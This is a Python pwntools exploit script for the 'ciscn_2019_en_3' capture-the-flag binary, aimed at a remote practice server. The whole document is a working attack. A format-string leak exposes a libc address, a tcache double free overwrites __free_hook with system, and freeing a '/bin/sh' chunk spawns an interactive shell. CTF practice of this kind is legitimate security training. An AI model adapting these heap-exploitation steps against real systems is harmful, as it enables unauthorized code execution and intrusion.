#!/usr/bin/env python
# coding=utf-8
from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'

local = 0
if local == 1:
    r=process('./ciscn_2019_en_3')
    
    gdb.attach(r,'b * $rebase(0xe05)')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    r=remote('node4.buuoj.cn',28000)
    libc = ELF('./libc.so.6')

elf = ELF('./ciscn_2019_en_3')


def add(size,content):
    r.recvuntil('choice:')
    r.sendline('1')
    r.recvuntil('story:')
    r.sendline(str(size))
    r.recvuntil('story:')
    r.sendline(content)
    
def dele(num):
    r.recvuntil('choice:')
    r.sendline('4')
    r.recvuntil('index:')
    r.sendline(str(num))


r.recvuntil('name?\n')
r.send('%p'*16)

r.recvuntil('0x110x')
r.recvuntil('0x')
libc_addr = int('0x'+r.recv(12),16)-0x3e82a0
log.success('libc_addr:'+hex(libc_addr))
free_hook = libc_addr + 0x3ed8e8
system = libc_addr + 0x4f440

r.sendline('a')

add(0x68,'/bin/sh\x00')
add(0x68,'a'*0x20)
add(0x68,'a'*0x20)

dele(1)
dele(1)

add(0x68,p64(free_hook))
add(0x68,'aaaaa')
add(0x68,p64(system))

dele(0)

r.interactive()
